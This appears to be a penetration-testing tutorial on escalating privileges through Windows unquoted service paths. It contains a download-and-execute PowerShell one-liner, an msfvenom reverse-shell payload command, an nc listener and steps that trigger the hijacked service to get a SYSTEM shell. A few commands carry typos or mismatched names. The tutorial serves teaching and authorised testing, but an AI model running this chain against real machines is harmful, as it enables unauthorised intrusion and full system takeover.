Unquoted Service Paths occur when a Windows service executable path contains spaces and isn't enclosed in quotes. Attackers can exploit this by placing a malicious executable in a higher directory level, which the system might execute instead of the legitimate service.

The Attack
---

For example, if the path to a service is the following: ```C:\Program Files (x86)\lols Program\bin\lol.exe```, this could be exploited by placing a binary as follows:

* `C:\Program.exe`
* `C:\Program Files (x86)\lols.exe`
* `C:\Program Files (x86)\lols Program\bin\lol.exe`


Identifying Unquoted Service Paths
---
1. Using `cmd`:
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
2. Automated scripts such as WinPEAS will also be able to identify them.
3. Metasploit exploit : ```exploit/windows/local/trusted_service_path```, once a Meterpreter session has been obtained.
4. PowerUp:

```
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-python-server/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files (x86)\lols Program\bin\lol.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'lol' -Path <HijackPath>
...
```

**Writing the Malicious Binary**
--


The next step is to add the malicious executable that will replace the service executable when it starts. In order for this to work, the current user ***requires write access*** to the service path.

This can be checked using the `icacls` Windows utility:
```
icalcs "C:\Program Files (x86)\lols Program"
```

NOTE: The main icacls permissions are as follows:

    F – Full access
    M– Modify access
    RX – Read and execute access
    R – Read-only access
    W – Write-only access
1. `MSFvenom` can be used to generate a reverse shell for us:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<our ip> LPORT=1234 -f exe > shell.exe
```
2. Then transferring the ```shell.exe``` file to the Windows victim machine using the Python web server, placing it in the ```C:\Program Files (x86)\lols Program``` or `C:\Program Files (x86)\` folder and calling it `lol.exe`.


3. The next step is to set up a `nc` listener, which will catch our reverse shell when it is executed by the victim host:
```
nc -nlvp 1234
```
4. The service can then be started or stoped with the following commands:
```
sc stop lol.exe
sc start lol.exe
```
Finally, we will capture the reverse connection and got the granted SYSTEM shell.



>Access to start or stop services is often denied, especially for normal users

The solution to this problem, if the service is set up to start at boot, is to restart the machine. The following command can be used to verify whether the current user has access to do so:
```
whoami /priv
```
![Screenshot from 2024-09-30 00-48-39](https://github.com/user-attachments/assets/2d05af9a-c33b-4251-86f2-035a7ad77bb3)

It looks like the current user has access to restart the machine. The following command can be used to reboot the box:
```
shutdown /r /t 0
```
After that we will capture the reverse connection and got the granted SYSTEM shell.



